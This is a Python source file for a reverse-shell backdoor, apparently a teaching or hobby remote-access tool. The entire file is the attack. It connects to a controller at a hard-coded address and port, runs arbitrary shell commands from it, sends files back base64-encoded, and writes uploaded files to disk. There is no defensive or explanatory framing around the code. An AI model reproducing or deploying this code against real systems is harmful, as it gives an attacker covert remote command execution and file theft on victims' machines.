import socket
import subprocess
import json
import os
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Creates a socket object (IPv4 and TCP)
        self.s.connect((ip, port))  # Establish the connection

    def execute(self, command):
        try:
            return subprocess.check_output(command, shell=True, text=True)  # Return output of the system command
        except subprocess.CalledProcessError:
            return "[+] Invalid command [+]"

    def send_json(self, data):
        json_data = json.dumps(data)  # Convert data to JSON
        self.s.send(json_data.encode())  # Send data

    def recieve_json(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.s.recv(1024).decode()  # Decode bytes to string
                return json.loads(json_data)  # Return the complete JSON data
            except ValueError:
                continue

    def change_dir(self, path):
        try:
            os.chdir(path)
        except OSError:
            return "Invalid path"
        return "Changed directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:  # Read binary file
            return base64.b64encode(file.read()).decode()  # Encode file content to base64

    def write_file(self, path, content):
        with open(path, "wb") as file:  # Write binary file
            file.write(base64.b64decode(content))
            return "[+] Upload successful [+]"

    def run(self):
        while True:
            command = self.recieve_json()  # Receive command
            try:
                if command[0] == "exit":
                    self.s.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_output = self.change_dir(command[1])
                elif command[0] == "download":
                    command_output = self.read_file(command[1])  # Read file to download
                    self.send_json(command_output)  # Send the file content to the server
                elif command[0] == "upload":
                    command_output = self.write_file(command[1], command[2])  # Save the uploaded file
                    self.send_json(command_output)
                else:
                    command_output = self.execute(command)  # Execute system command
                self.send_json(command_output)  # Send command output to the server
            except Exception:
                command_output = "[+] Error during execution of the command [+] "
                self.send_json(command_output)

backdoor = Backdoor("127.0.0.1", 4444)  # Connect to the server
backdoor.run()
